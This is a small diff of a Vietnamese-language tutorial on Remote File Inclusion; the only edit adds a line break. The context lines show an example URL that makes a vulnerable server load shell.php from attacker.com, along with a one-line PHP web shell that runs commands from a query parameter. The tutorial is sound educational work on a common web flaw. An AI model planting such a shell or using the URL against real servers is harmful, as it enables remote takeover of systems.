@@ -41,7 +41,7 @@ URL sau : <br>
 http://testphp.com/index.php?page=http://attacker.com/shell.php
 ```
 Tệp shell.php có nội dung : `<?php system($_GET['cmd']); ?>` <br>
-Từ đó tệp shell.php sẽ được tải về và thực thi trên server.
+Từ đó tệp shell.php sẽ được tải về và thực thi trên server. <br>
 Lưu ý: RFI sẽ không hoạt động nếu có prefix đứng trước tham số URL
 ```
 <?php
